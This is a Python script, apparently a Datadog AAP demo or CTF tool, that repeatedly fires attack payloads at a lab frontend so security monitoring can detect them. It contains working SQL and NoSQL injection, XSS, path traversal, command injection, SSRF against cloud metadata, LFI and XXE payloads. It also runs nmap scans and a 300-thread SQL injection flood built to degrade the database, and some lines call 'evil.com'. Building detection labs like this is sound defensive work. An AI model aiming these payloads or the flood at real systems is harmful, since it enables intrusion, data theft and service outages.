#!/usr/bin/env python3
"""
Datadog AAP Attack Simulator
Periodically fires attack payloads at the frontend to be detected by Datadog ASM/AAP (CTF #44-46, #54-59)
"""
import requests
import time
import logging
import os
import subprocess
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading
import random
import uuid

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# Target frontend URL and timing configuration
FRONTEND_URL = os.getenv('FRONTEND_URL', 'http://frontend')
ATTACK_INTERVAL = int(os.getenv('ATTACK_INTERVAL', '60'))  # Interval between regular attack suites (seconds)
LATENCY_ATTACK_INTERVAL = int(os.getenv('LATENCY_ATTACK_INTERVAL', '3600'))  # Interval between latency degradation attacks (seconds, default 1 hour)

def log_attack(attack_name, success=True, details=""):
    """Log the result of an attack attempt."""
    status = "✅ SUCCESS" if success else "❌ FAILED"
    logger.info(f"{status} | {attack_name} | {details}")

def attack_sql_injection():
    """SQL Injection attack — detected by Datadog ASM (CTF #56-57)"""
    logger.info("🎯 SQL Injection Attack")
    
    payloads = [
        "' OR '1'='1",
        "1' UNION SELECT NULL--",
        "admin'--",
        "' OR 1=1--",
        "1' AND '1'='1"
    ]
    
    for payload in payloads:
        try:
            response = requests.get(
                f"{FRONTEND_URL}/api/product/{payload}",
                timeout=5
            )
            log_attack("SQL Injection", True, f"Payload: {payload}, Status: {response.status_code}")
        except Exception as e:
            log_attack("SQL Injection", False, f"Payload: {payload}, Error: {str(e)}")
        time.sleep(1)

def attack_xss():
    """XSS (Cross-Site Scripting) attack — detected by Datadog ASM (CTF #54)"""
    logger.info("🎯 XSS Attack")
    
    payloads = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg/onload=alert('XSS')>",
        "javascript:alert('XSS')",
        "<iframe src='javascript:alert(1)'>"
    ]
    
    for payload in payloads:
        try:
            response = requests.post(
                f"{FRONTEND_URL}/api/login",
                json={"username": payload, "password": "test"},
                timeout=5
            )
            log_attack("XSS", True, f"Payload: {payload[:50]}, Status: {response.status_code}")
        except Exception as e:
            log_attack("XSS", False, f"Payload: {payload[:50]}, Error: {str(e)}")
        time.sleep(1)

def attack_path_traversal():
    """Path Traversal attack — detected by Datadog ASM"""
    logger.info("🎯 Path Traversal Attack")
    
    payloads = [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "....//....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..;/..;/..;/etc/passwd"
    ]
    
    for payload in payloads:
        try:
            response = requests.get(
                f"{FRONTEND_URL}/static/{payload}",
                timeout=5
            )
            log_attack("Path Traversal", True, f"Payload: {payload}, Status: {response.status_code}")
        except Exception as e:
            log_attack("Path Traversal", False, f"Payload: {payload}, Error: {str(e)}")
        time.sleep(1)

def attack_command_injection():
    """Command Injection attack — detected by Datadog ASM"""
    logger.info("🎯 Command Injection Attack")
    
    payloads = [
        "; ls -la",
        "| cat /etc/passwd",
        "`whoami`",
        "$(cat /etc/passwd)",
        "; ping -c 1 evil.com"
    ]
    
    for payload in payloads:
        try:
            response = requests.get(
                f"{FRONTEND_URL}/search?q={payload}",
                timeout=5
            )
            log_attack("Command Injection", True, f"Payload: {payload}, Status: {response.status_code}")
        except Exception as e:
            log_attack("Command Injection", False, f"Payload: {payload}, Error: {str(e)}")
        time.sleep(1)

def attack_ssrf():
    """SSRF (Server-Side Request Forgery) attack — detected by Datadog ASM"""
    logger.info("🎯 SSRF Attack")
    
    payloads = [
        "http://169.254.169.254/latest/meta-data/",
        "http://localhost:8080/admin",
        "http://127.0.0.1:22",
        "file:///etc/passwd",
        "http://metadata.google.internal/computeMetadata/v1/"
    ]
    
    for payload in payloads:
        try:
            response = requests.post(
                f"{FRONTEND_URL}/api/webhook",
                json={"url": payload},
                timeout=5
            )
            log_attack("SSRF", True, f"Payload: {payload}, Status: {response.status_code}")
        except Exception as e:
            log_attack("SSRF", False, f"Payload: {payload}, Error: {str(e)}")
        time.sleep(1)

def attack_nosql_injection():
    """NoSQL Injection attack — detected by Datadog ASM"""
    logger.info("🎯 NoSQL Injection Attack")
    
    payloads = [
        {"username": {"$ne": None}, "password": {"$ne": None}},
        {"username": {"$gt": ""}, "password": {"$gt": ""}},
        {"username": "admin", "password": {"$regex": ".*"}},
    ]
    
    for payload in payloads:
        try:
            response = requests.post(
                f"{FRONTEND_URL}/api/login",
                json=payload,
                timeout=5
            )
            log_attack("NoSQL Injection", True, f"Payload: {str(payload)[:50]}, Status: {response.status_code}")
        except Exception as e:
            log_attack("NoSQL Injection", False, f"Payload: {str(payload)[:50]}, Error: {str(e)}")
        time.sleep(1)

def attack_header_injection():
    """HTTP Header Injection attack — detected by Datadog ASM"""
    logger.info("🎯 Header Injection Attack")
    
    malicious_headers = [
        {"X-Forwarded-For": "127.0.0.1"},
        {"User-Agent": "<script>alert('XSS')</script>"},
        {"Referer": "javascript:alert('XSS')"},
        {"X-Original-URL": "/admin"},
        {"Host": "evil.com"}
    ]
    
    for headers in malicious_headers:
        try:
            response = requests.get(
                f"{FRONTEND_URL}/",
                headers=headers,
                timeout=5
            )
            log_attack("Header Injection", True, f"Header: {list(headers.keys())[0]}, Status: {response.status_code}")
        except Exception as e:
            log_attack("Header Injection", False, f"Header: {list(headers.keys())[0]}, Error: {str(e)}")
        time.sleep(1)

def attack_network_scan():
    """Network scan attack using Nmap — detected by Datadog ASM"""
    logger.info("🎯 Network Scan (Nmap)")
    
    try:
        # Port scan
        result = subprocess.run(
            ["nmap", "-p", "80,443", "-sT", "frontend"],
            capture_output=True,
            timeout=30
        )
        log_attack("Nmap Port Scan", result.returncode == 0, f"Return code: {result.returncode}")
        
        time.sleep(2)
        
        # Service version detection
        result = subprocess.run(
            ["nmap", "-sV", "-p", "80", "frontend"],
            capture_output=True,
            timeout=30
        )
        log_attack("Nmap Service Detection", result.returncode == 0, f"Return code: {result.returncode}")
        
    except Exception as e:
        log_attack("Network Scan", False, f"Error: {str(e)}")

def attack_lfi():
    """Local File Inclusion (LFI) attack — detected by Datadog ASM"""
    logger.info("🎯 LFI Attack")
    
    payloads = [
        "/etc/passwd",
        "php://filter/convert.base64-encode/resource=index.php",
        "file:///etc/passwd",
        "/proc/self/environ",
        "/var/log/apache2/access.log"
    ]
    
    for payload in payloads:
        try:
            response = requests.get(
                f"{FRONTEND_URL}/?file={payload}",
                timeout=5
            )
            log_attack("LFI", True, f"Payload: {payload}, Status: {response.status_code}")
        except Exception as e:
            log_attack("LFI", False, f"Payload: {payload}, Error: {str(e)}")
        time.sleep(1)

def attack_xxe():
    """XXE (XML External Entity) attack — detected by Datadog ASM"""
    logger.info("🎯 XXE Attack")
    
    xxe_payload = '''<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<foo>&xxe;</foo>'''
    
    try:
        response = requests.post(
            f"{FRONTEND_URL}/api/xml",
            data=xxe_payload,
            headers={"Content-Type": "application/xml"},
            timeout=5
        )
        log_attack("XXE", True, f"Status: {response.status_code}")
    except Exception as e:
        log_attack("XXE", False, f"Error: {str(e)}")


def attack_latency_degradation():
    """
    Intentional latency degradation via heavy SQL Injection payloads (CTF #58-59)

    Attack flow:
    1. Send complex SQL injection payloads to the login and product endpoints
    2. Overload the database with UNION, subquery, and time-based blind payloads
    3. Detected by Datadog ASM + causes visible latency spike in APM

    Expected impact:
    - Normal latency: 10-50ms
    - Attack latency: 5000-20000ms (5-20 seconds)
    """
    logger.info("=" * 70)
    logger.info("🔥 SQL INJECTION LATENCY ATTACK STARTED (EXTREME) 🔥")
    logger.info("=" * 70)
    logger.info("📊 Attack Scenario:")
    logger.info("   - 300 concurrent SQL injection attackers (DOUBLED!)")
    logger.info("   - Complex payloads causing database overload")
    logger.info("   - AAP will detect as SQL injection attacks")
    logger.info("   - Causes EXTREME latency degradation (20+ seconds!)")
    logger.info("=" * 70)
    logger.info("📊 Expected Impact:")
    logger.info("   - Normal latency: 10-50ms")
    logger.info("   - Attack latency: 10000-25000ms (10-25 seconds!)")
    logger.info("   - Duration: ~120 seconds")
    logger.info("   - AAP Detection: appsec-rl-000-002 (SQL injection)")
    logger.info("=" * 70)
    
    attack_duration = 120  # Total attack window: 120 seconds
    start_time = time.time()
    
    # Number of parallel workers (doubled from original 150)
    parallel_workers = 300
    
    # Heavy SQL injection payloads designed to overload the database
    HEAVY_SQL_PAYLOADS = [
        # UNION-based injection — extracts multiple columns, heavyweight
        "' UNION SELECT username, password, email, created_at, updated_at, id, role, status FROM users WHERE '1'='1",
        "' UNION SELECT table_name, column_name, data_type, character_maximum_length, is_nullable, column_default, ordinal_position, table_schema FROM information_schema.columns WHERE '1'='1",
        
        # Time-based blind injection — introduces intentional delays
        "' OR (SELECT COUNT(*) FROM users WHERE username LIKE '%admin%' AND SLEEP(5))--",
        "' AND (SELECT * FROM (SELECT(SLEEP(10)))a)--",
        "'; WAITFOR DELAY '00:00:05'--",
        
        # Nested subqueries — expensive to evaluate
        "' OR EXISTS(SELECT * FROM users WHERE username IN (SELECT username FROM users WHERE role='admin'))--",
        "' UNION SELECT * FROM (SELECT username FROM users UNION SELECT email FROM users UNION SELECT password FROM users) AS combined--",
        
        # Boolean-based blind — requires many requests, high load
        "' OR (SELECT COUNT(*) FROM users) > 0--",
        "' OR (SELECT LENGTH(password) FROM users WHERE username='admin') > 10--",
        "' OR (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'--",
        
        # Stacked queries — attempts to execute multiple statements
        "'; SELECT * FROM users; SELECT * FROM orders; SELECT * FROM products;--",
        "'; UPDATE users SET last_login=NOW() WHERE username='admin';--",
        
        # Heavy computation via Cartesian product
        "' OR 1=(SELECT COUNT(*) FROM users CROSS JOIN users CROSS JOIN users)--",
        "' UNION SELECT * FROM users WHERE username LIKE '%' AND password LIKE '%'--",
        
        # Out-of-band injection attempts
        "' OR (SELECT LOAD_FILE('/etc/passwd'))--",
        "'; EXEC xp_cmdshell('ping evil.com');--",
    ]
    
    def sql_injection_attacker():
        """Execute a single SQL injection request with a random heavy payload."""
        attack_id = str(uuid.uuid4())[:8]
        
        try:
            # Pick a random payload from the heavy payload list
            payload = random.choice(HEAVY_SQL_PAYLOADS)
            
            # Spread attacks across multiple endpoints for broader load
            endpoints = [
                f"/api/product/{payload}",
                f"/product/{payload}",
                f"/?search={payload}",
                f"/api/login?username={payload}",
            ]
            
            endpoint = random.choice(endpoints)
            
            start_request_time = time.time()
            response = requests.get(
                f"{FRONTEND_URL}{endpoint}",
                timeout=60,  # Allow long timeouts to capture full latency impact
                allow_redirects=False
            )
            elapsed = time.time() - start_request_time
            
            log_attack(
                "SQL Injection", 
                True,
                f"ID: {attack_id}, Endpoint: {endpoint[:50]}, Status: {response.status_code}, Latency: {elapsed:.2f}s"
            )
            
        except Exception as e:
            log_attack("SQL Injection", False, f"ID: {attack_id}, Error: {str(e)}")
    
    def rapid_sql_injection_attacker():
        """Continuously fire SQL injection requests for the full attack duration (120 seconds)."""
        attack_count = 0
        while time.time() - start_time < attack_duration:
            sql_injection_attacker()
            attack_count += 1
            time.sleep(0.005)  # 200 requests/second per worker
        
        log_attack("Rapid SQL Injection", True, f"Completed {attack_count} attacks in {attack_duration}s")
    
    # Run all attackers in parallel
    with ThreadPoolExecutor(max_workers=parallel_workers) as executor:
        futures = []
        
        # 150 one-shot attackers — immediate burst
        logger.info("💉 Launching 150 one-time SQL injection attackers...")
        for i in range(150):
            futures.append(executor.submit(sql_injection_attacker))
        
        # 150 continuous attackers — sustained pressure for 120 seconds
        logger.info("🔥 Launching 150 rapid continuous SQL injection attackers...")
        for i in range(150):
            futures.append(executor.submit(rapid_sql_injection_attacker))
        
        # Wait for all tasks (max 130 seconds)
        completed = 0
        successful_attacks = 0
        failed_attacks = 0
        
        for future in as_completed(futures, timeout=attack_duration + 10):
            try:
                result = future.result()
                completed += 1
            except Exception as e:
                logger.error(f"Attack task failed: {str(e)}")
                failed_attacks += 1
    
    elapsed = time.time() - start_time
    logger.info("=" * 70)
    logger.info(f"🔥 SQL INJECTION LATENCY ATTACK COMPLETED 🔥")
    logger.info(f"   Duration: {elapsed:.1f}s")
    logger.info(f"   Completed tasks: {completed}/{len(futures)}")
    logger.info("=" * 70)
    logger.info("📊 Check Datadog for:")
    logger.info("   ✅ AAP Security Signals: appsec-rl-000-002 (SQL injection)")
    logger.info("   ✅ APM Latency spike on GET /?search=* (10-25 seconds!)")
    logger.info("   ✅ APM Latency spike on GET /api/product/* (10-25 seconds!)")
    logger.info("   ✅ APM Latency spike on GET /product/* (10-25 seconds!)")
    logger.info("   ✅ EXTREME Database CPU usage")
    logger.info("   ✅ Slow query logs")
    logger.info("   ✅ Error rate increase (500 errors)")
    logger.info("   ✅ Service Map showing database bottleneck")
    logger.info("=" * 70)
    logger.info("🎯 This simulates an EXTREME SQL Injection attack:")
    logger.info("   - 300 concurrent SQL injection attackers (DOUBLED!)")
    logger.info("   - Complex payloads (UNION, subqueries, time-based blind)")
    logger.info("   - AAP detects massive malicious SQL patterns")
    logger.info("   - Database overload causes EXTREME latency degradation")
    logger.info("   - Latency: 10-25 seconds (clearly visible in APM)")
    logger.info("=" * 70)

def run_attack_suite():
    """Run all attack types in sequence."""
    logger.info("=" * 60)
    logger.info(f"🚀 Starting Attack Suite at {datetime.now()}")
    logger.info(f"🎯 Target: {FRONTEND_URL}")
    logger.info("=" * 60)
    
    attacks = [
        ("SQL Injection", attack_sql_injection),
        ("XSS", attack_xss),
        ("Path Traversal", attack_path_traversal),
        ("Command Injection", attack_command_injection),
        ("SSRF", attack_ssrf),
        ("NoSQL Injection", attack_nosql_injection),
        ("Header Injection", attack_header_injection),
        ("Network Scan", attack_network_scan),
        ("LFI", attack_lfi),
        ("XXE", attack_xxe),
    ]
    
    for name, attack_func in attacks:
        try:
            attack_func()
            time.sleep(2)  # Brief pause between attack types
        except Exception as e:
            logger.error(f"❌ {name} failed: {str(e)}")
    
    logger.info("=" * 60)
    logger.info(f"✅ Attack Suite Completed at {datetime.now()}")
    logger.info("=" * 60)

if __name__ == "__main__":
    logger.info("🤖 Datadog AAP Attack Simulator Started")
    logger.info(f"Target: {FRONTEND_URL}")
    logger.info(f"Regular Attack Interval: {ATTACK_INTERVAL} seconds")
    logger.info(f"Latency Attack Interval: {LATENCY_ATTACK_INTERVAL} seconds ({LATENCY_ATTACK_INTERVAL/3600:.1f} hours)")
    
    last_latency_attack_time = 0
    
    while True:
        try:
            current_time = time.time()
            
            # Regular attack suite
            run_attack_suite()
            
            # Scheduled latency degradation attack (every LATENCY_ATTACK_INTERVAL seconds)
            if current_time - last_latency_attack_time >= LATENCY_ATTACK_INTERVAL:
                logger.info("")
                logger.info("⏰ Time for scheduled latency degradation attack!")
                logger.info("")
                attack_latency_degradation()
                last_latency_attack_time = current_time
                logger.info("")
                logger.info("⏰ Next latency attack in 1 hour")
                logger.info("")
            else:
                time_until_next = LATENCY_ATTACK_INTERVAL - (current_time - last_latency_attack_time)
                logger.info(f"⏰ Next latency attack in {time_until_next/60:.1f} minutes")
            
            logger.info(f"⏳ Sleeping for {ATTACK_INTERVAL} seconds...")
            time.sleep(ATTACK_INTERVAL)
            
        except KeyboardInterrupt:
            logger.info("🛑 Attack Simulator Stopped")
            break
        except Exception as e:
            logger.error(f"❌ Unexpected error: {str(e)}")
            time.sleep(30)

